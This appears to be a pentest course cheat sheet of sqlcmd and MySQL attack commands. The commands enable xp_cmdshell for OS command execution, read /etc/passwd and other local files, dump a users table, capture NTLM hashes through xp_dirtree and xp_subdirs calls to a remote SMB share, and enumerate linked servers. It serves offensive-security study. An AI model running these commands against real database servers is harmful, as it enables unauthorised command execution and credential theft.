# sqlcmd command examples

OS: Linux
Description: List of MSSQL Commands
Security Domains: Reconnaissance (https://www.notion.so/Reconnaissance-1434c8e5237680fe960be92e51e13491?pvs=21), Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21)

| `sqlcmd> SELECT name FROM master.dbo.sysdatabases` | Show all available databases in MSSQL. |
| --- | --- |
| `sqlcmd> USE htbusers` | Select a specific database in MSSQL. |
| `sqlcmd> SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES` | Show all available tables in the selected database in MSSQL. |
| `sqlcmd> SELECT * FROM users` | Select all available entries from the "users" table in MSSQL. |
| `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
| `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
| `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |

| `sqlcmd> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` | Read local files in MSSQL. |
| --- | --- |
| `mysql> select LOAD_FILE("/etc/passwd");` | Read local files in MySQL. |
| `sqlcmd> EXEC master..xp_dirtree '\\10.10.110.17\share\'` | Hash stealing using the `xp_dirtree` command in MSSQL. |
| `sqlcmd> EXEC master..xp_subdirs '\\10.10.110.17\share\'` | Hash stealing using the `xp_subdirs` command in MSSQL. |
| `sqlcmd> SELECT srvname, isremote FROM sysservers` | Identify linked servers in MSSQL. |
| `sqlcmd> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` | Identify the user and its privileges used for the remote connection in MSSQL. |